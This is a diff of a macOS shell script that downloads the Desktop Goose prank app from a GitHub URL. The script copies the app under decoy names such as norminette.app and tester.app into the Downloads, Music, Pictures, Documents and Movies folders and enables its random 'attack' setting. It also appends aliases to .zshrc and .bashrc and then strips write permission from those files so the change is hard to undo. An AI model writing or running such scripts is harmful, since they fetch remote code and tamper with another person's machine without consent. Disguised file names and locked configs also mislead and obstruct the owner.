@@ -2,18 +2,16 @@
 
 # Define the file URL and target paths
 FILE_URL="https://raw.githubusercontent.com/PaulicStudios/goose/refs/heads/main/goose.zip"
-
-HOME="~"
-HOME_DIR="~"
-DOWNLOAD_DIR="~/Downloads"
-MUSIC_DIR="~/Music"
-Applications="~/Applications"
-Pictures="~/Pictures"
-Documents="~/Documents"
-Movies="~/Movies"
+HOME_DIR="$HOME"
+DOWNLOAD_DIR="$HOME/Downloads"
+MUSIC_DIR="$HOME/Music"
+Applications="$HOME/Applications"
+Pictures="$HOME/Pictures"
+Documents="$HOME/Documents"
+Movies="$HOME/Movies"
 
 # File names for different locations
-HOME_FILE="moulinette.app"
+HOME_FILE="goose.app"
 DOWNLOAD_FILE="norminette.app"
 MUSIC_FILE="tester.app"
 Applications="yersts.app"
@@ -26,31 +24,17 @@ defaults write net.namedfork.DesktopGoose CanAttackAtRandom YES
 
 # Download the file to all locations
 echo "Downloading the file..."
-curl -o "$DOWNLOAD_DIR/$HOME_FILE" "$FILE_URL"
-unzip -n "$DOWNLOAD_DIR/$HOME_FILE"
-chmod +x "$DOWNLOAD_DIR/$HOME_FILE"
-
-
-chmod +w "~/.zshrc"
-chmod +w "~/.bashrc"
-
-# Remove write access from the downloaded file
-chmod +w "$HOME_DIR/$HOME_FILE"
-chmod +w "$DOWNLOAD_DIR/$DOWNLOAD_FILE"
-chmod +w "$MUSIC_DIR/$MUSIC_FILE"
-chmod +w "$APPLICATIONS_DIR/$APPLICATIONS_FILE"
-chmod +w "$PICTURES_DIR/$PICTURES_FILE"
-chmod +w "$DOCUMENTS_DIR/$DOCUMENTS_FILE"
-chmod +w "$MOVIES_DIR/$MOVIES_FILE"
+curl -o "$DOWNLOAD_DIR/download.zip" "$FILE_URL"
+unzip -n "$DOWNLOAD_DIR/download.zip"
 
 
 echo "Copying the file to all locations..."
-cp "$DOWNLOAD_DIR/$HOME_FILE" "$DOWNLOAD_DIR/$DOWNLOAD_FILE"
-cp "$DOWNLOAD_DIR/$HOME_FILE" "$MUSIC_DIR/$MUSIC_FILE"
-cp "$DOWNLOAD_DIR/$HOME_FILE" "$APPLICATIONS_DIR/$APPLICATIONS_FILE"
-cp "$DOWNLOAD_DIR/$HOME_FILE" "$PICTURES_DIR/$PICTURES_FILE"
-cp "$DOWNLOAD_DIR/$HOME_FILE" "$DOCUMENTS_DIR/$DOCUMENTS_FILE"
-cp "$DOWNLOAD_DIR/$HOME_FILE" "$MOVIES_DIR/$MOVIES_FILE"
+cp -R "$DOWNLOAD_DIR/$HOME_FILE" "$DOWNLOAD_DIR/$DOWNLOAD_FILE"
+cp -R "$DOWNLOAD_DIR/$HOME_FILE" "$MUSIC_DIR/$MUSIC_FILE"
+cp -R "$DOWNLOAD_DIR/$HOME_FILE" "$APPLICATIONS_DIR/$APPLICATIONS_FILE"
+cp -R "$DOWNLOAD_DIR/$HOME_FILE" "$PICTURES_DIR/$PICTURES_FILE"
+cp -R "$DOWNLOAD_DIR/$HOME_FILE" "$DOCUMENTS_DIR/$DOCUMENTS_FILE"
+cp -R "$DOWNLOAD_DIR/$HOME_FILE" "$MOVIES_DIR/$MOVIES_FILE"
 
 # Function to add alias to a file
 add_alias_to_shell_rc() {
@@ -82,14 +66,5 @@ add_alias_to_shell_rc "$HOME/.bashrc"
 
 chmod -w "$HOME/.zshrc"
 chmod -w "$HOME/.bashrc"
-
-# Remove write access from the downloaded file
-chmod -w "$HOME_DIR/$HOME_FILE"
-chmod -w "$DOWNLOAD_DIR/$DOWNLOAD_FILE"
-chmod -w "$MUSIC_DIR/$MUSIC_FILE"
-chmod -w "$APPLICATIONS_DIR/$APPLICATIONS_FILE"
-chmod -w "$PICTURES_DIR/$PICTURES_FILE"
-chmod -w "$DOCUMENTS_DIR/$DOCUMENTS_FILE"
-chmod -w "$MOVIES_DIR/$MOVIES_FILE"
 
 echo "Script complete! Restart your terminal or source the updated shell configuration files."
